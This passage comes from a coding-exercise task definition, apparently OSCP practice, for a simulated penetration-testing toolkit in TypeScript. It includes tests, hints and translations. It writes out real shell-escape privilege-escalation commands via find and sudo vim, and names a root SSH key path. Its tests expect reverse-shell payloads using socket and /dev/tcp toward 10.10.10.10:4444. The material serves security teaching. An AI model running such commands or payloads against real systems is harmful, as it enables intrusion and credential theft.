
  enumeratePrivEsc(ip: string): PrivEscVector[] {
    const target = this.targets.get(ip);
    if (!target || target.accessLevel === 'none') return [];

    this.log(\`Enumerating privilege escalation vectors on \${ip}\`);
    const vectors: PrivEscVector[] = [];

    if (target.os === 'linux') {
      vectors.push({ type: 'suid', target: '/usr/bin/find', likelihood: 'high', command: 'find . -exec /bin/sh \\\\; -quit' });
      vectors.push({ type: 'sudo', target: 'vim', likelihood: 'high', command: "sudo vim -c '!sh'" });
      vectors.push({ type: 'kernel', target: 'DirtyCow (CVE-2016-5195)', likelihood: 'medium' });
    }
    return vectors;
  }

  attemptPrivilegeEscalation(ip: string, vector: PrivEscVector): { success: boolean; newAccessLevel: 'user' | 'root' } {
    const target = this.targets.get(ip);
    if (!target) return { success: false, newAccessLevel: 'user' };

    this.log(\`Attempting privilege escalation via \${vector.type}: \${vector.target}\`);
    if (vector.likelihood === 'high') { target.accessLevel = 'root'; return { success: true, newAccessLevel: 'root' }; }
    return { success: false, newAccessLevel: 'user' };
  }

  extractSensitiveData(ip: string): { type: 'password' | 'key' | 'token' | 'config'; location: string; value: string }[] {
    const target = this.targets.get(ip);
    if (!target || target.accessLevel === 'none') return [];

    const data: { type: 'password' | 'key' | 'token' | 'config'; location: string; value: string }[] = [];
    if (target.accessLevel === 'root' || target.accessLevel === 'user') {
      data.push({ type: 'config', location: '/var/www/html/config.php', value: "db_password = 'secret'" });
    }
    if (target.accessLevel === 'root') {
      data.push({ type: 'key', location: '/root/.ssh/id_rsa', value: '-----BEGIN RSA PRIVATE KEY-----' });
    }
    return data;
  }

  generateReport(ip: string): PenTestReport {
    const target = this.targets.get(ip);
    if (!target) return { target: ip, executiveSummary: 'Target not found', findings: [], attackPath: [], recommendations: [] };

    const findings = target.vulnerabilities.map(v => ({
      title: \`\${v.service.toUpperCase()} - \${v.id}\`,
      severity: v.severity as 'critical' | 'high' | 'medium' | 'low' | 'info',
      description: \`Vulnerability in \${v.service}\`,
      impact: v.severity === 'critical' ? 'Complete compromise' : 'Limited impact',
      remediation: \`Patch \${v.service}\`,
      evidence: [\`Service: \${v.service}\`],
    }));

    return {
      target: ip,
      executiveSummary: \`Pentest of \${ip} found \${target.vulnerabilities.length} vulnerabilities\`,
      findings,
      attackPath: ['Reconnaissance', 'Vulnerability scan', 'Exploitation'],
      recommendations: ['Patch systems', 'Enable monitoring'],
    };
  }

  getAttackLog(): string[] { return [...this.attackLog]; }

  calculateRiskScore(ip: string): { score: number; breakdown: Record<string, number> } {
    const target = this.targets.get(ip);
    if (!target) return { score: 0, breakdown: {} };

    const breakdown: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0 };
    for (const v of target.vulnerabilities) {
      if (v.severity === 'critical') breakdown.critical += 25;
      else if (v.severity === 'high') breakdown.high += 15;
      else if (v.severity === 'medium') breakdown.medium += 8;
      else breakdown.low += 3;
    }
    const score = Math.min(100, Object.values(breakdown).reduce((a, b) => a + b, 0));
    return { score, breakdown };
  }
}

describe('PenTestToolkit', () => {
  let toolkit: PenTestToolkit;

  beforeEach(() => {
    toolkit = new PenTestToolkit();
  });

  it('should add and track targets', () => {
    const target = toolkit.addTarget('192.168.1.100');
    expect(target.ip).toBe('192.168.1.100');
    expect(target.accessLevel).toBe('none');
    expect(target.services).toHaveLength(0);
  });

  it('should simulate port scanning', () => {
    toolkit.addTarget('192.168.1.100');
    const services = toolkit.simulatePortScan('192.168.1.100', [1, 1024]);

    expect(services.length).toBeGreaterThan(0);
    expect(services.some(s => s.service === 'ssh')).toBe(true);
    expect(services.some(s => s.service === 'http')).toBe(true);
  });

  it('should perform OS fingerprinting', () => {
    toolkit.addTarget('192.168.1.100');
    toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
    const result = toolkit.fingerprint('192.168.1.100');

    expect(result.os).toBe('linux');
    expect(result.confidence).toBeGreaterThan(0.5);
  });

  it('should scan for vulnerabilities', () => {
    toolkit.addTarget('192.168.1.100');
    toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
    const vulns = toolkit.scanForVulnerabilities('192.168.1.100');

    expect(vulns.length).toBeGreaterThan(0);
    expect(vulns.some(v => v.severity === 'critical')).toBe(true);
  });

  it('should check for default credentials', () => {
    toolkit.addTarget('192.168.1.100');
    const ftpCheck = toolkit.checkDefaultCredentials('192.168.1.100', 'ftp');
    const sshCheck = toolkit.checkDefaultCredentials('192.168.1.100', 'ssh');

    expect(ftpCheck.vulnerable).toBe(true);
    expect(ftpCheck.credentials?.username).toBe('anonymous');
    expect(sshCheck.vulnerable).toBe(false);
  });

  it('should generate reverse shell payloads', () => {
    const pythonPayload = toolkit.generatePayload('reverse_shell', {
      lhost: '10.10.10.10',
      lport: 4444,
      format: 'python',
    });
    const bashPayload = toolkit.generatePayload('reverse_shell', {
      lport: 4444,
      format: 'bash',
    });

    expect(pythonPayload).toContain('socket');
    expect(pythonPayload).toContain('10.10.10.10');
    expect(bashPayload).toContain('/dev/tcp');
  });

  it('should attempt exploitation', () => {
    toolkit.addTarget('192.168.1.100');
    toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
    toolkit.scanForVulnerabilities('192.168.1.100');

    const result = toolkit.attemptExploit('192.168.1.100', 'VULN-001');

    expect(result.success).toBe(true);
    expect(result.accessGained).toBe('root');
    expect(result.shell).toBeDefined();
  });

  it('should enumerate privilege escalation vectors', () => {
    toolkit.addTarget('192.168.1.100');
    toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
    toolkit.fingerprint('192.168.1.100');
    toolkit.scanForVulnerabilities('192.168.1.100');
    toolkit.attemptExploit('192.168.1.100', 'VULN-003'); // Get user access first

    const vectors = toolkit.enumeratePrivEsc('192.168.1.100');

    expect(vectors.length).toBeGreaterThan(0);
    expect(vectors.some(v => v.type === 'suid')).toBe(true);
  });

  it('should generate penetration test reports', () => {
    toolkit.addTarget('192.168.1.100');
    toolkit.simulatePortScan('192.168.1.100', [1, 1024]);
    toolkit.scanForVulnerabilities('192.168.1.100');

    const report = toolkit.generateReport('192.168.1.100');

    expect(report.target).toBe('192.168.1.100');
    expect(report.findings.length).toBeGreaterThan(0);
    expect(report.recommendations.length).toBeGreaterThan(0);
  });

  it('should maintain attack log', () => {
    toolkit.addTarget('192.168.1.100');
    toolkit.simulatePortScan('192.168.1.100', [1, 1024]);

    const log = toolkit.getAttackLog();

    expect(log.length).toBeGreaterThan(0);
    expect(log.some(entry => entry.includes('Target added'))).toBe(true);
    expect(log.some(entry => entry.includes('Port scan'))).toBe(true);
  });
});`,
	hint1:
		'For port scanning simulation, create a list of common services (SSH:22, HTTP:80, HTTPS:443, SMB:445, MySQL:3306) with their typical banners. Filter by the requested port range.',
	hint2:
		'For OS fingerprinting, analyze service banners for keywords: "Ubuntu", "Apache", "OpenSSH" suggest Linux; "Windows", "IIS", port 3389 suggest Windows. Calculate confidence based on the number of matching indicators.',
	whyItMatters: `OSCP is the gold standard certification for penetration testing:

**Real-World Methodology:**
- **Reconnaissance**: The foundation of every successful pentest - understanding the target before attacking
- **Exploitation**: Real vulnerabilities like vsftpd 2.3.4 backdoor have been used in actual attacks
- **Post-Exploitation**: Privilege escalation via SUID binaries, sudo misconfigurations are common in CTFs and real assessments

**Industry Impact:**
- **Bug Bounty Programs**: OSCP methodology applies directly to platforms like HackerOne, Bugcrowd
- **Red Team Operations**: Enterprise security teams use these exact techniques
- **Compliance Testing**: PCI-DSS, HIPAA require periodic penetration testing

**Notable Examples:**
- **Equifax Breach (2017)**: Started with a vulnerable Apache Struts server (similar to our HTTP vulnerabilities)
- **WannaCry (2017)**: Exploited SMB vulnerabilities (EternalBlue) - our SMB scanning simulates this
- **SolarWinds (2020)**: Supply chain attack that began with reconnaissance

OSCP teaches "Try Harder" mindset - the persistence needed for real security work.`,
	order: 4,
	translations: {
		ru: {
			title: 'Практика пентестинга OSCP',
			description: `Практикуйте концепции OSCP (Offensive Security Certified Professional) через программирование.

**Области фокуса OSCP:**

1. **Сбор информации** - Пассивная и активная разведка
2. **Сканирование уязвимостей** - Идентификация слабых мест
3. **Эксплуатация** - Получение доступа к системам
4. **Пост-эксплуатация** - Повышение привилегий, закрепление
5. **Документация** - Профессиональные отчёты

**Ваша задача:**

Реализуйте класс \`PenTestToolkit\`, который симулирует методологию пентестинга.`,
			hint1:
				'Для симуляции сканирования портов создайте список распространённых сервисов (SSH:22, HTTP:80, SMB:445) с их типичными баннерами. Фильтруйте по запрошенному диапазону портов.',
			hint2:
				'Для определения ОС анализируйте баннеры сервисов: "Ubuntu", "Apache", "OpenSSH" указывают на Linux; "Windows", "IIS", порт 3389 указывают на Windows.',
			whyItMatters: `OSCP - золотой стандарт сертификации для пентестинга:

**Реальная методология:**
- **Разведка**: Основа любого успешного пентеста - понимание цели перед атакой
- **Эксплуатация**: Реальные уязвимости как vsftpd 2.3.4 backdoor использовались в реальных атаках
- **Пост-эксплуатация**: Повышение привилегий через SUID, sudo - частые находки в CTF и реальных проверках

**Влияние на индустрию:**
- **Bug Bounty программы**: Методология OSCP применима к HackerOne, Bugcrowd
- **Red Team операции**: Корпоративные команды безопасности используют эти техники
- **Тестирование соответствия**: PCI-DSS, HIPAA требуют периодического пентеста

**Примеры:**
- **Утечка Equifax (2017)**: Началась с уязвимого Apache Struts
- **WannaCry (2017)**: Эксплуатировал уязвимости SMB (EternalBlue)
- **SolarWinds (2020)**: Атака на цепочку поставок`,
		},
		uz: {
			title: 'OSCP Pentest Amaliyoti',
			description: `OSCP (Offensive Security Certified Professional) konsepsiyalarini practixsh orqali mashq qiling.

**OSCP Yo'nalishlari:**

1. **Ma'lumot to'plash** - Passiv va aktiv razvedka
2. **Zaiflik skanerlash** - Zaif joylarni aniqlash
3. **Ekspluatatsiya** - Tizimlarga kirish olish
4. **Post-ekspluatatsiya** - Imtiyozlarni oshirish, mustahkamlash
5. **Hujjatlashtirish** - Professional hisobotlar

**Vazifangiz:**

Pentest metodologiyasini simulyatsiya qiladigan \`PenTestToolkit\` klassini yarating.`,
			hint1:
				"Port skanerlash simulyatsiyasi uchun keng tarqalgan xizmatlar ro'yxatini yarating (SSH:22, HTTP:80, SMB:445) ularning odatiy bannerlari bilan. So'ralgan port diapazoni bo'yicha filtrlang.",
			hint2:
				"OT aniqlash uchun xizmat bannerlarini tahlil qiling: 'Ubuntu', 'Apache', 'OpenSSH' Linuxni ko'rsatadi; 'Windows', 'IIS', port 3389 Windowsni ko'rsatadi.",
			whyItMatters: `OSCP - pentest uchun oltin standart sertifikati:

**Haqiqiy metodologiya:**
- **Razvedka**: Har qanday muvaffaqiyatli pentestning asosi - hujumdan oldin maqsadni tushunish
- **Ekspluatatsiya**: vsftpd 2.3.4 backdoor kabi haqiqiy zaifliklar real hujumlarda ishlatilgan
- **Post-ekspluatatsiya**: SUID, sudo orqali imtiyozlarni oshirish - CTF va real tekshiruvlarda tez-tez uchraydi

**Sanoatga ta'siri:**
- **Bug Bounty dasturlari**: OSCP metodologiyasi HackerOne, Bugcroudga bevosita qo'llaniladi
- **Red Team operatsiyalari**: Korporativ xavfsizlik jamoalari aynan shu texnikalardan foydalanadi
- **Muvofiqlik testi**: PCI-DSS, HIPAA davriy pentestni talab qiladi`,
		},
	},
};

export default task;
